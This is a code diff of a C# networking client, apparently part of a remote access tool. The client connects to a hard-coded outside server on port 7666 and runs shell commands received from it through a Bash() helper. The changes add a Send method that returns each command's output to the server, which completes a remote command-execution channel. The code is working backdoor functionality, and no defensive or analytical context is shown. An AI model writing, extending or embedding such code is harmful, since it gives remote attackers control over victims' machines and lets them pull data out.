@@ -11,14 +11,19 @@ namespace ClientO1
         public static char Sep = ';';
         public static void Handle_Archive(String Data, Byte[] Bytes)
         {
-            switch (ReadField(1,Data,Sep).ToLower())
+            String Datos = ReadField(1, Data, Sep);
+            var output = "";
+            switch (Datos.ToLower())
             {
                 case "mkdl":
-                    //var output = "cd /root".Bash();
-                    Console.WriteLine("cd /root".Bash());
+                    output = "cd /root".Bash();
+                    Console.WriteLine(output);
+                    Declas.Conection.Send("mensa;" +output);
                     break;
                 case "mkda":
-                    Console.WriteLine(ReadEnd(Data,4).Bash());
+                    output = ReadEnd(Data, 4).Bash();
+                    Console.WriteLine(output);
+                    Declas.Conection.Send("mensa;" + output);
                     break;
             }
         }
@@ -51,11 +56,8 @@ namespace ClientO1
             switch (Datos.ToLower())
             {
                 case "msg":
-                    Console.WriteLine(Data);
+                    Console.WriteLine("msg:" + Data);
 
-                    break;
-                case "hldac":
-                    Console.WriteLine(Data);
                     break;
             }
         }
@@ -79,9 +81,6 @@ namespace ClientO1
                     Handle_Archive(data, Bytes);
                     break;
                 case 5:
-                    Handle_Texto(data);
-                    break;
-                default:
                     Handle_Texto(data);
                     break;
             }
@@ -122,9 +121,24 @@ public class Conn
         public const short AF_INET = 2;
         public const short AF_INET6 = 23;
         public String response = String.Empty;
-        public Encoding Enco = Encoding.Unicode;
+        public Encoding Enco = Encoding.UTF32;
         private string ip = "networkhit.securitytactics.com", serverPort = "7666";
+        //private string ip = "127.0.0.1", serverPort = "7666";
         private Thread Th_Rec;
+        public int Send(String mes)
+        {
+            try
+            {
+                Byte[] nbuf = Enco.GetBytes(mes);
+                int res = Sock_.Send(nbuf);
+
+                return res;
+            }
+            catch
+            {
+                return -1;
+            }
+        }
         public void Config_Server()
         {
             Sock_ = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
@@ -149,6 +163,7 @@ public class Conn
                     int bytesRec = Sock_.Receive(bytes, SocketFlags.None);
                     String Resp = Enco.GetString(bytes, 0, bytesRec);
                     //MessageBoxEx.Show(Resp);
+                    //Console.WriteLine(Resp);
                     if (bytesRec > 0)
                         HandleData.Handle_Data(Resp, bytes);
                 }
